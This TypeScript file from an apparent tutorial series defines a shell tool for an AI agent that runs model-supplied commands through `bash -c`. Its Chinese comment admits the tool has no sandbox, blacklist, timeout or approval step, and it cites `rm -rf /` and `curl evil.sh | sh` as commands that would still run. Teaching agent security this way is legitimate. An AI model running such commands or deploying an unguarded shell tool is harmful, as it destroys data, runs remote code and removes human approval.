import type { Tool } from '../types'

/**
 * 逃生舱：跑任意 shell 命令。窄工具（read/write/edit/ls）覆盖不到的活（npm test、git、grep…）靠它兜底。
 *
 * ⚠️⚠️ 这是"裸奔版"：把模型给的字符串原样丢进 `bash -c`，无沙箱、无命令黑名单、无超时、无审批。
 * 一个 `rm -rf /` 或 `curl evil.sh | sh` 照跑不误（回扣 Blog30 工具即权限 / 致命三件套）。
 * 真实 BashTool 为这把锁写了约 1 万行（bashSecurity/pathValidation/readOnlyValidation/沙箱判定…）。
 * 那把锁是实战04 的正题；这一篇只把逃生舱的"门"装上，先不上锁。
 */
export const bashTool: Tool = {
  name: 'bash',
  description:
    '在 shell 中执行一条命令，返回 stdout 与 stderr。适合窄工具覆盖不到的操作（如 npm test、git、grep）。',
  parameters: {
    type: 'object',
    properties: {
      command: { type: 'string', description: '要执行的 shell 命令' },
    },
    required: ['command'],
  },
  execute: async (args: { command?: string }) => {
    const command = args?.command
    if (!command) return 'error: 缺少 command 参数'
    try {
      const proc = Bun.spawn(['bash', '-c', command], { stdout: 'pipe', stderr: 'pipe' })
      const [out, err] = await Promise.all([
        new Response(proc.stdout).text(),
        new Response(proc.stderr).text(),
      ])
      await proc.exited
      const code = proc.exitCode
      const body = [out.trim(), err.trim() && `[stderr]\n${err.trim()}`].filter(Boolean).join('\n')
      return body || `（命令无输出，退出码 ${code}）`
    } catch (e) {
      return `error: 命令执行失败: ${(e as Error).message}`
    }
  },
}
